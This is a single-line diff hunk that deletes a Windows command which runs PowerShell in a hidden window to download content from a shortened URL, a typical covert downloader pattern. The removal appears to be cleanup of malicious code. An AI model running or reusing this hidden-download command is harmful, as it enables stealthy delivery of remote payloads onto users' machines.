@@ -1,1 +1,0 @@
-C:\WINDOWS\system32\cmd.exe /k powershell -W Hidden powershell -command (Invoke-webrequest -URI "https://clck.ru/37GVor" -UseBasicParsing).Content
